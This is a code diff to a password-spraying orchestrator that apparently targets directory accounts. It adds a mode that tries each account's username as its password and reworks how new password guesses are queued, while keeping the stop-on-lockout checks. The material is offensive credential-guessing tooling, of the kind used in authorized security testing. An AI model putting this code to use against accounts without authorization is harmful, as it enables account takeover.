@@ -309,9 +309,6 @@ class SprayOrchestrator:
 
     def _feed_work_queue(self) -> None:
         """Read passwords from file and feed work queue, monitoring for new passwords."""
-        if not self.config.password_file:
-            return
-
         seen_passwords = set()
         total_tests = 0
         last_file_check = 0
@@ -326,35 +323,58 @@ class SprayOrchestrator:
         ) as progress:
             task = progress.add_task("Spraying passwords", total=total_tests)
 
+            # Add user-as-pass tests if enabled
+            if self.config.user_as_pass:
+                for user in self.users:
+                    if self.stop_event.is_set() or self.lockout_event.is_set():
+                        break
+
+                    password = user.samaccountname
+                    work_item = WorkItem(user=user, password=password)
+                    self.work_queue.put(work_item)
+                    seen_passwords.add(password)
+
+                total_tests = len(self.users)
+                progress.update(task, total=total_tests)
+                self.console.print(f"[cyan]Added user-as-pass tests, total tests: {total_tests}[/cyan]")
+
             while any(w.is_alive() for w in self.workers):
                 if self.stop_event.is_set() or self.lockout_event.is_set():
                     break
 
-                # Check for new passwords every second
-                current_time = time.time()
-                if current_time - last_file_check >= 1.0:
-                    last_file_check = current_time
-                    new_passwords = self._read_new_passwords(seen_passwords)
+                # Check for new passwords every second if password file exists
+                if self.config.password_file:
+                    current_time = time.time()
+                    if current_time - last_file_check >= 1.0:
+                        last_file_check = current_time
+                        new_passwords = self._read_new_passwords(seen_passwords)
 
-                    if new_passwords:
-                        # Add new passwords to queue
-                        for password in new_passwords:
-                            if self.stop_event.is_set() or self.lockout_event.is_set():
-                                break
-
-                            for user in self.users:
+                        if new_passwords:
+                            # Add new passwords to queue
+                            for password in new_passwords:
                                 if self.stop_event.is_set() or self.lockout_event.is_set():
                                     break
 
-                                work_item = WorkItem(user=user, password=password)
-                                self.work_queue.put(work_item)
+                                for user in self.users:
+                                    if self.stop_event.is_set() or self.lockout_event.is_set():
+                                        break
 
-                            seen_passwords.add(password)
-                            total_tests += len(self.users)
+                                    work_item = WorkItem(user=user, password=password)
+                                    self.work_queue.put(work_item)
 
-                        # Update progress bar with new total
-                        progress.update(task, total=total_tests)
-                        self.console.print(f"[cyan]Added {len(new_passwords)} new password(s), total tests: {total_tests}[/cyan]")
+                                seen_passwords.add(password)
+                                total_tests += len(self.users)
+
+                            # Update progress bar with new total
+                            progress.update(task, total=total_tests)
+                            self.console.print(f"[cyan]Added {len(new_passwords)} new password(s), total tests: {total_tests}[/cyan]")
+                else:
+                    # No password file - check if all work is done
+                    if self.work_queue.empty():
+                        with self.completed_lock:
+                            if self.completed_count >= total_tests:
+                                # All work is done, stop workers
+                                break
 
                 # Update completed count
                 with self.completed_lock:
